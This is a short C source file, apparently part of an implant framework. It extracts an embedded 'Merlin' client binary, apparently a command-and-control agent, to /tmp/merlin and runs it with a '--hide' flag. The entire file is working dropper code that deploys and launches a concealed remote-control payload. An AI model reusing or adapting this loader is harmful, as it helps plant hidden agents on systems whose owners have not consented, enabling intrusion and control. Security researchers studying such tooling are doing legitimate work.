#include <dispatch.h>
#include <lib/extract.h>

extern char _binary_client_payloads_merlin_merlinClient_start[];
extern char _binary_client_payloads_merlin_merlinClient_end[];

#ifndef MERLIN_EXTRACT_PATH
#define MERLIN_EXTRACT_PATH "/tmp/merlin"
#endif /* MERLIN_EXTRACT_PATH */

int extract_merlin()
{
	ssize_t bytes_to_write, nbytes;

	bytes_to_write = _binary_client_payloads_merlin_merlinClient_end -
			 _binary_client_payloads_merlin_merlinClient_start;
	nbytes = extract(MERLIN_EXTRACT_PATH,
			 _binary_client_payloads_merlin_merlinClient_start,
			 bytes_to_write);

	if (nbytes < bytes_to_write) {
		IMLOG_DEBUG("Failed to write the required bytes");
		remove(MERLIN_EXTRACT_PATH);
		return -1;
	}

	return 0;
}

int exec()
{
	char *argv[] = { "exec", "--hide", MERLIN_EXTRACT_PATH, "-sleep 1",
			 NULL };
	size_t len = sizeof(argv) / sizeof(argv[0]) - 1;
	return dispatch(len, argv);
}

int merlin_load()
{
	int ret_code;

	ret_code = extract_merlin();
	if (ret_code < 0) {
		return ret_code;
	}
	alert("Merlin extracted successfully\n");

	ret_code = exec();
	if (ret_code < 0) {
		return ret_code;
	}
	alert("Merlin executed successfully\n");

	return 0;
}